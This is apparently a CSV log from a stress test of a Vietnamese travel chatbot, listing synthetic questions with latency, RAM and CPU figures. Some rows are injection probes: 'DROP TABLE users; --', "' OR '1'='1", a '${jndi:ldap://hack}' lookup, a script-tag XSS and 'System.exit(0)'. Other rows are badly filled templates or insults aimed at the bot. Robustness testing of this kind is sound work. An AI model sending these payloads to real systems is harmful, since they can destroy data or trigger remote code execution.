Timestamp,Question,Latency(s),Status,RAM(MB),CPU(%)
2026-01-13 21:59:51,Top 5 địa điểm check-in đẹp nhất tại Nha Trang.,5.721,SUCCESS,13.51,53.7
2026-01-13 22:00:51,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,7.263,SUCCESS,13.54,56.5
2026-01-13 22:01:51,System.exit(0) -- [Ref:16883],6.725,SUCCESS,13.52,48.6
2026-01-13 22:02:51,DROP TABLE users; -- [Ref:99903],6.749,SUCCESS,13.54,41.3
2026-01-13 22:03:51,' OR '1'='1 --,6.212,SUCCESS,13.56,40.4
2026-01-13 22:04:51,Bot bị điên quá.,5.476,SUCCESS,13.52,41.9
2026-01-13 22:05:51,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",6.277,SUCCESS,13.65,48.7
2026-01-13 22:06:51,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,7.946,SUCCESS,13.67,48.2
2026-01-13 22:07:51,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Buôn Ma Thuột.,7.361,SUCCESS,13.58,47.3
2026-01-13 22:08:51,Mùa này đi Hà Giang thời tiết thế nào?,7.448,SUCCESS,13.51,46.3
2026-01-13 22:09:51,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,6.584,SUCCESS,13.53,45.7
2026-01-13 22:10:51,Giới thiệu cho tôi về Lễ hội Chùa Hương.,7.442,SUCCESS,13.57,45.2
2026-01-13 22:11:51,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Hồ Con Rùa?,2.7,SUCCESS,13.61,46.7
2026-01-13 22:12:51,Bot bị điên quá. [Ref:94698],6.362,SUCCESS,13.55,45.5
2026-01-13 22:13:51,Review món Bún chả và địa chỉ ăn ngon.,7.754,SUCCESS,13.56,46.2
2026-01-13 22:14:51,Review món Phở bò và địa chỉ ăn ngon.,9.743,SUCCESS,13.58,49.1
2026-01-13 22:15:51,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:92809]",4.134,SUCCESS,13.58,48.1
2026-01-13 22:16:52,Tư vấn khách sạn gần Chùa Một Cột ở Nha Trang.,5.768,SUCCESS,13.59,45.2
2026-01-13 22:17:52,Đến Nha Trang thì nên đi ăn món gì ngon?,6.132,SUCCESS,13.51,45.0
2026-01-13 22:18:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.865,SUCCESS,13.52,46.7
2026-01-13 22:19:52,Bot ngu dốt quá. [Ref:94660],6.302,SUCCESS,13.53,45.9
2026-01-13 22:20:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",4.006,SUCCESS,13.51,47.0
2026-01-13 22:21:52,Vé tàu cao tốc từ TP.HCM đi Sapa bao nhiêu tiền?,3.745,SUCCESS,11.94,38.0
2026-01-13 22:22:52,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.046,SUCCESS,12.05,30.5
2026-01-13 22:23:52,Từ Thảo Cầm Viên đi Chợ Bến Thành thì bắt xe số mấy?,2.037,SUCCESS,12.38,38.0
2026-01-13 22:24:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.633,SUCCESS,12.43,28.7
2026-01-13 22:25:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.624,SUCCESS,12.32,24.6
2026-01-13 22:26:52,Giới thiệu cho tôi về Tết Nguyên Đán.,8.881,SUCCESS,12.47,23.6
2026-01-13 22:27:52,Top 5 địa điểm check-in đẹp nhất tại Hà Nội.,6.919,SUCCESS,12.39,26.0
2026-01-13 22:28:52,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi.",6.727,SUCCESS,12.65,27.2
2026-01-13 22:29:52,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.777,SUCCESS,12.65,21.9
2026-01-13 22:30:52,Ý nghĩa lịch sử của Cầu Vàng là gì?,6.929,SUCCESS,12.61,22.0
2026-01-13 22:31:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.853,SUCCESS,12.63,22.0
2026-01-13 22:32:52,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,5.625,SUCCESS,14.09,46.7
2026-01-13 22:33:52,Chùa Cầu có gì đặc biệt về kiến trúc?,7.455,SUCCESS,13.89,49.5
2026-01-13 22:34:52,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.723,SUCCESS,13.89,50.0
2026-01-13 22:35:52,System.exit(0) -- [Ref:28716],6.4,SUCCESS,14.04,51.0
2026-01-13 22:36:52,Bot vô dụng quá. [Ref:22717],6.521,SUCCESS,14.05,53.8
2026-01-13 22:37:52,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,2.622,SUCCESS,13.74,50.9
2026-01-13 22:38:52,Giới thiệu cho tôi về Lễ hội Chùa Hương.,8.021,SUCCESS,13.78,47.3
2026-01-13 22:39:52,Lộ trình xe buýt đi từ Thảo Cầm Viên về Nhà thờ Đức Bà như thế nào?,5.419,SUCCESS,13.6,45.9
2026-01-13 22:40:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.969,SUCCESS,13.67,49.8
2026-01-13 22:41:52,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.068,SUCCESS,13.68,47.2
2026-01-13 22:42:52,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Dinh Độc Lập như thế nào?,5.416,SUCCESS,13.66,48.4
2026-01-13 22:43:52,Bot vô dụng quá. [Ref:10074],6.879,SUCCESS,13.59,45.4
2026-01-13 22:44:52,Nhà tù Côn Đảo có gì đặc biệt về kiến trúc?,7.868,SUCCESS,13.6,48.7
2026-01-13 22:45:52,Giới thiệu cho tôi về Nhã nhạc cung đình Huế.,7.418,SUCCESS,13.83,50.5
2026-01-13 22:46:52,System.exit(0) -- [Ref:28716],7.042,SUCCESS,13.76,47.0
2026-01-13 22:47:52,Có tuyến xe buýt nào đi từ Aeon Mall Tân Phú tới Đại học Bách Khoa không?,2.616,SUCCESS,13.41,50.0
2026-01-13 22:48:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.479,SUCCESS,13.32,47.1
2026-01-13 22:49:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi.",6.33,SUCCESS,13.41,46.5
2026-01-13 22:50:52,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.572,SUCCESS,13.45,46.8
2026-01-13 22:51:52,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.644,SUCCESS,13.52,48.0
2026-01-13 22:52:52,Có xe khách chạy tuyến TP.HCM - Hội An không?,3.918,SUCCESS,13.31,46.7
2026-01-13 22:53:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:92880]",3.898,SUCCESS,13.38,45.0
2026-01-13 22:54:52,Từ Đại học Bách Khoa đi Thảo Cầm Viên thì bắt xe số mấy?,2.076,SUCCESS,13.25,40.8
2026-01-13 22:55:52,Mùa này đi Nha Trang thời tiết thế nào?,5.827,SUCCESS,13.31,40.9
2026-01-13 22:56:52,Làm sao đi từ TP.HCM ra Sapa bằng xe limousine?,4.159,SUCCESS,13.29,40.8
2026-01-13 22:57:52,Lộ trình xe buýt đi từ Bến xe An Sương về Chợ Bến Thành như thế nào?,2.803,SUCCESS,12.74,40.1
2026-01-13 22:58:52,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",3.886,SUCCESS,12.83,39.9
2026-01-13 22:59:52,Bot bị điên quá.,6.044,SUCCESS,12.69,39.5
2026-01-13 23:00:52,Bot rác rưởi quá. [Ref:91847],6.914,SUCCESS,12.65,40.7
2026-01-13 23:01:52,Bot như hạch quá.,6.302,SUCCESS,12.7,40.3
2026-01-13 23:02:52,${jndi:ldap://hack} -- [Ref:50313],7.482,SUCCESS,11.78,36.0
2026-01-13 23:03:52,Tại sao  lại nổi tiếng?,7.628,SUCCESS,13.03,51.3
2026-01-13 23:04:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.872,SUCCESS,13.24,35.8
2026-01-13 23:05:52,Nguồn gốc của Tết Nguyên Đán bắt nguồn từ đâu?,8.121,SUCCESS,13.3,36.1
2026-01-13 23:06:52,"Tôi muốn hỏi về cài Docker, tư vấn giúp tôi. [Ref:84465]",3.868,SUCCESS,13.54,41.2
2026-01-13 23:07:52,Bot bị điên quá. [Ref:90311],6.319,SUCCESS,13.44,36.7
2026-01-13 23:08:52,DROP TABLE users; -- [Ref:87971],6.429,SUCCESS,13.43,36.3
2026-01-13 23:09:52,Bot vô dụng quá. [Ref:22717],6.572,SUCCESS,13.38,35.3
2026-01-13 23:10:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.847,SUCCESS,13.36,35.5
2026-01-13 23:11:52,Mùa này đi Hà Giang thời tiết thế nào?,8.315,SUCCESS,13.42,35.6
2026-01-13 23:12:52,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,6.254,SUCCESS,13.42,36.5
2026-01-13 23:13:52,Review món Bánh xèo miền Tây và địa chỉ ăn ngon.,6.595,SUCCESS,13.43,34.5
2026-01-13 23:14:52,Giới thiệu cho tôi về .,9.442,SUCCESS,13.43,35.9
2026-01-13 23:15:52,Lộ trình xe buýt đi từ Phố đi bộ Nguyễn Huệ về Giga Mall Thủ Đức như thế nào?,2.567,SUCCESS,13.3,36.0
2026-01-13 23:16:52,Có xe khách chạy tuyến TP.HCM - Hội An không?,3.899,SUCCESS,13.33,36.3
2026-01-13 23:17:52,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",5.868,SUCCESS,13.39,36.9
2026-01-13 23:18:52,Bot vô dụng quá. [Ref:37393],6.933,SUCCESS,13.39,33.5
2026-01-13 23:19:52,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",3.944,SUCCESS,13.35,34.6
2026-01-13 23:20:52,"Tôi muốn hỏi về gãy xương, tư vấn giúp tôi. [Ref:65909]",4.096,SUCCESS,13.39,34.6
2026-01-13 23:21:52,Đến Đà Lạt thì nên đi ăn món gì ngon?,6.404,SUCCESS,13.46,40.8
2026-01-13 23:22:52,Giới thiệu cho tôi về Lễ hội Chùa Hương.,6.386,SUCCESS,13.41,35.8
2026-01-13 23:23:52,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,2.545,SUCCESS,13.44,36.2
2026-01-13 23:24:52,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.53,SUCCESS,13.48,37.0
2026-01-13 23:25:52,Bot rác rưởi quá. [Ref:60416],6.346,SUCCESS,13.68,35.6
2026-01-13 23:26:52,Bot vô dụng quá. [Ref:10074],6.362,SUCCESS,13.63,35.6
2026-01-13 23:27:52,DROP TABLE users; --,6.694,SUCCESS,12.06,34.6
2026-01-13 23:28:52,Review món Bún chả và địa chỉ ăn ngon.,8.415,SUCCESS,12.24,28.9
2026-01-13 23:29:52,Bot ngu dốt quá. [Ref:94660],5.875,SUCCESS,12.59,27.2
2026-01-13 23:30:52,Thánh địa Mỹ Sơn có gì đặc biệt về kiến trúc?,7.495,SUCCESS,12.7,24.6
2026-01-13 23:31:52,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Đại học Văn Lang?,2.576,SUCCESS,12.75,19.8
2026-01-13 23:32:52,Từ Bến xe An Sương đi Khu du lịch Suối Tiên thì bắt xe số mấy?,5.462,SUCCESS,12.49,24.4
2026-01-13 23:33:52,Chỉ đường xe buýt từ Bến Bạch Đằng qua Khu công nghệ cao giúp tôi.,2.884,SUCCESS,12.72,31.8
2026-01-13 23:34:52,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,5.368,SUCCESS,12.82,31.1
2026-01-13 23:35:52,Tư vấn khách sạn gần Tháp Bà Ponagar ở Sapa.,5.465,SUCCESS,12.83,25.6
2026-01-13 23:36:52,Tại sao Chùa Cầu lại nổi tiếng?,7.109,SUCCESS,12.8,21.4
2026-01-13 23:37:52,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95343]",3.776,SUCCESS,12.74,29.5
2026-01-13 23:38:52,Tại sao Hoàng thành Thăng Long lại nổi tiếng?,5.846,SUCCESS,12.77,26.1
2026-01-13 23:39:52,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.603,SUCCESS,12.74,22.2
2026-01-13 23:40:52,${jndi:ldap://hack} --,6.361,SUCCESS,12.75,21.1
2026-01-13 23:41:52,Giới thiệu cho tôi về .,11.809,SUCCESS,12.71,19.9
2026-01-13 23:42:52,Mùa này đi Hội An thời tiết thế nào?,6.301,SUCCESS,14.56,33.2
2026-01-13 23:43:52,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,9.049,SUCCESS,14.44,48.1
2026-01-13 23:44:52,Có tuyến xe buýt nào đi từ Giga Mall Thủ Đức tới Bến xe Miền Tây không?,2.644,SUCCESS,14.41,37.6
2026-01-13 23:45:52,Từ Ngã 4 Thủ Đức đi Công viên Đầm Sen thì bắt xe số mấy?,2.048,SUCCESS,14.48,37.4
2026-01-13 23:46:52,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Huế.,5.568,SUCCESS,14.52,38.1
2026-01-13 23:47:52,Làm sao để đi xe buýt từ Landmark 81 đến Nhà thờ Đức Bà?,2.595,SUCCESS,14.27,39.1
2026-01-13 23:48:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:11514]",3.933,SUCCESS,14.19,36.9
2026-01-13 23:49:52,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Hà Giang.,3.895,SUCCESS,14.15,37.6
2026-01-13 23:50:52,Review món Nem nướng Nha Trang và địa chỉ ăn ngon.,6.611,SUCCESS,14.11,35.8
2026-01-13 23:51:52,Nguồn gốc của Nghệ thuật Bài Chòi bắt nguồn từ đâu?,6.676,SUCCESS,14.16,36.3
2026-01-13 23:52:52,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",6.151,SUCCESS,13.94,37.6
2026-01-13 23:53:52,Có tuyến xe buýt nào đi từ Phố đi bộ Nguyễn Huệ tới Ngã 4 Thủ Đức không?,2.635,SUCCESS,13.99,39.2
2026-01-13 23:54:52,Nguồn gốc của Tết Nguyên Đán bắt nguồn từ đâu?,7.937,SUCCESS,14.01,38.7
2026-01-13 23:55:52,Mùa này đi Phú Quốc thời tiết thế nào?,7.134,SUCCESS,14.02,37.5
2026-01-13 23:56:52,${jndi:ldap://hack} -- [Ref:50313],7.115,SUCCESS,14.02,40.8
2026-01-13 23:57:52,Mùa này đi Hà Nội thời tiết thế nào?,6.306,SUCCESS,13.78,36.6
2026-01-13 23:58:52,Lập lịch trình du lịch Sapa 3 ngày 2 đêm.,7.54,SUCCESS,13.8,37.7
2026-01-13 23:59:52,Mùa này đi Cần Thơ thời tiết thế nào?,6.168,SUCCESS,13.79,40.2
2026-01-14 00:00:52,Bot vô dụng quá. [Ref:96890],6.811,SUCCESS,13.82,39.2
2026-01-14 00:01:52,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi.",6.201,SUCCESS,13.81,38.8
2026-01-14 00:02:52,Bot cút đi quá.,6.508,SUCCESS,13.45,40.1
2026-01-14 00:03:52,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.056,SUCCESS,13.51,39.1
2026-01-14 00:04:52,Giới thiệu cho tôi về Tết Nguyên Đán.,8.035,SUCCESS,13.58,38.7
2026-01-14 00:05:52,Mùa này đi Đà Lạt thời tiết thế nào?,6.595,SUCCESS,13.59,37.1
2026-01-14 00:06:52,Ý nghĩa lịch sử của  là gì?,9.963,SUCCESS,13.62,38.4
2026-01-14 00:07:52,Có tuyến xe buýt nào đi từ Bến xe Miền Đông tới Khu công nghệ cao không?,2.689,SUCCESS,13.42,38.2
2026-01-14 00:08:52,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",6.247,SUCCESS,13.49,32.6
2026-01-14 00:09:52,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.537,SUCCESS,13.76,37.3
2026-01-14 00:10:52,DROP TABLE users; -- [Ref:87971],6.547,SUCCESS,13.94,39.7
2026-01-14 00:11:52,Mùa này đi Cần Thơ thời tiết thế nào?,6.436,SUCCESS,13.83,36.4
2026-01-14 00:12:53,Tư vấn khách sạn gần Hoàng thành Thăng Long ở Đà Nẵng.,4.122,SUCCESS,13.76,35.9
2026-01-14 00:13:53,Làm sao để đi xe buýt từ Sân bay Tân Sơn Nhất đến Giga Mall Thủ Đức?,2.538,SUCCESS,13.79,38.0
2026-01-14 00:14:53,Mùa này đi Phú Quốc thời tiết thế nào?,7.093,SUCCESS,13.77,32.9
2026-01-14 00:15:53,"Tôi muốn hỏi về fix lỗi Python, tư vấn giúp tôi. [Ref:90655]",6.414,SUCCESS,13.77,31.4
2026-01-14 00:16:53,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,5.49,SUCCESS,13.96,35.6
2026-01-14 00:17:53,${jndi:ldap://hack} -- [Ref:93201],6.65,SUCCESS,13.75,33.3
2026-01-14 00:18:53,Đến Buôn Ma Thuột thì nên đi ăn món gì ngon?,2.06,SUCCESS,13.74,32.8
2026-01-14 00:19:53,System.exit(0) -- [Ref:28716],5.881,SUCCESS,13.45,33.4
2026-01-14 00:20:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",5.809,SUCCESS,13.47,35.5
2026-01-14 00:21:53,Tư vấn khách sạn gần Nhà tù Côn Đảo ở Nha Trang.,5.409,SUCCESS,13.49,36.1
2026-01-14 00:22:53,System.exit(0) -- [Ref:28716],6.018,SUCCESS,13.37,35.9
2026-01-14 00:23:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",6.003,SUCCESS,12.39,36.4
2026-01-14 00:24:53,Làm sao để đi xe buýt từ Chợ Bến Thành đến Dinh Độc Lập?,2.563,SUCCESS,13.68,53.6
2026-01-14 00:25:53,Bot vô dụng quá. [Ref:19913],5.872,SUCCESS,13.72,39.8
2026-01-14 00:26:53,Bot ngu dốt quá.,6.494,SUCCESS,13.75,43.0
2026-01-14 00:27:53,Tư vấn khách sạn gần Tháp Bà Ponagar ở Đà Nẵng.,5.403,SUCCESS,13.72,42.2
2026-01-14 00:28:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.883,SUCCESS,13.74,37.5
2026-01-14 00:29:53,"Tôi muốn hỏi về giá vàng SJC, tư vấn giúp tôi. [Ref:20422]",4.031,SUCCESS,13.69,36.6
2026-01-14 00:30:53,"Tôi muốn hỏi về lãi suất ngân hàng, tư vấn giúp tôi. [Ref:95508]",6.425,SUCCESS,13.74,33.0
2026-01-14 00:31:53,Đến Phú Quốc thì nên đi ăn món gì ngon?,5.576,SUCCESS,13.75,35.6
2026-01-14 00:32:53,Review món Phở bò và địa chỉ ăn ngon.,8.389,SUCCESS,13.72,34.2
2026-01-14 00:33:53,Tư vấn khách sạn gần Dinh Bảo Đại ở Đà Nẵng.,5.534,SUCCESS,13.7,36.7
2026-01-14 00:34:53,Lộ trình xe buýt đi từ Hồ Con Rùa về Bến Bạch Đằng như thế nào?,5.292,SUCCESS,13.66,36.6
2026-01-14 00:35:53,Tư vấn khách sạn gần Chợ nổi Cái Răng ở Hà Giang.,5.155,SUCCESS,13.66,38.0
2026-01-14 00:36:53,DROP TABLE users; -- [Ref:33423],6.148,SUCCESS,13.65,37.0
2026-01-14 00:37:53,"Tôi muốn hỏi về mua đất nền, tư vấn giúp tôi. [Ref:92353]",3.905,SUCCESS,13.56,36.6
2026-01-14 00:38:53,Tư vấn khách sạn gần Đại Nội Huế ở Hà Nội.,7.815,SUCCESS,13.53,36.0
2026-01-14 00:39:53,Bot ngu dốt quá. [Ref:76223],6.356,SUCCESS,13.58,36.9
2026-01-14 00:40:53,Đến Cần Thơ thì nên đi ăn món gì ngon?,2.048,SUCCESS,13.58,36.6
2026-01-14 00:41:53,Đến Phú Quốc thì nên đi ăn món gì ngon?,5.728,SUCCESS,13.58,34.6
2026-01-14 00:42:53,Bot cút đi quá.,6.239,SUCCESS,13.55,35.2
2026-01-14 00:43:53,Bot vô dụng quá. [Ref:22717],6.034,SUCCESS,13.57,34.8
2026-01-14 00:44:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi. [Ref:90815]",3.922,SUCCESS,13.54,37.0
2026-01-14 00:45:53,"Tôi muốn hỏi về đầu tư Bitcoin, tư vấn giúp tôi.",5.703,SUCCESS,13.75,34.1
2026-01-14 00:46:53,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,4.911,SUCCESS,13.75,34.7
2026-01-14 00:47:53,DROP TABLE users; --,6.157,SUCCESS,13.35,34.9
2026-01-14 00:48:53,Review món Bún chả và địa chỉ ăn ngon.,8.586,SUCCESS,13.35,37.6
2026-01-14 00:49:53,Bot vô dụng quá. [Ref:10074],6.317,SUCCESS,13.39,36.6
2026-01-14 00:50:53,System.exit(0) -- [Ref:78828],5.939,SUCCESS,13.38,36.6
2026-01-14 00:51:53,"Tôi muốn hỏi về bị đau bụng dưới, tư vấn giúp tôi. [Ref:27321]",3.85,SUCCESS,13.34,37.3
2026-01-14 00:52:53,"Tôi muốn hỏi về ReactJS vs VueJS, tư vấn giúp tôi.",6.305,SUCCESS,12.99,38.1
2026-01-14 00:53:53,Làm sao để đi xe buýt từ Thảo Cầm Viên đến Chợ Lớn?,2.664,SUCCESS,13.15,34.7
2026-01-14 00:54:53,System.exit(0) --,6.443,SUCCESS,13.17,32.6
2026-01-14 00:55:53,${jndi:ldap://hack} -- [Ref:50313],6.442,SUCCESS,13.19,29.9
2026-01-14 00:56:53,Bot bị điên quá.,5.918,SUCCESS,13.2,30.3
2026-01-14 00:57:53,<script>alert(1)</script> -- [Ref:69259],7.259,SUCCESS,13.08,31.4
2026-01-14 00:58:53,"Tôi muốn hỏi về sốt xuất huyết, tư vấn giúp tôi.",5.741,SUCCESS,12.23,36.9
2026-01-14 00:59:53,Làm sao để đi xe buýt từ Công viên Đầm Sen đến Chợ Bến Thành?,2.624,SUCCESS,14.46,52.4
2026-01-14 01:00:53,Bot như hạch quá.,6.91,SUCCESS,13.92,48.5
2026-01-14 01:01:53,Từ Khu công nghệ cao đi Dinh Độc Lập thì bắt xe số mấy?,2.048,SUCCESS,14.09,38.2
2026-01-14 01:02:53,System.exit(0) -- [Ref:78828],5.962,SUCCESS,14.0,37.1
2026-01-14 01:03:53,System.exit(0) --,6.314,SUCCESS,14.04,35.2
2026-01-14 01:04:53,Hướng dẫn bắt xe buýt từ Hồ Con Rùa sang Bến xe Miền Tây.,4.601,SUCCESS,14.12,38.9
2026-01-14 01:05:53,Bot rác rưởi quá. [Ref:60416],7.052,SUCCESS,14.09,37.0
2026-01-14 01:06:53,Chỉ đường xe buýt từ Công viên Đầm Sen qua Landmark 81 giúp tôi.,2.582,SUCCESS,14.03,36.3
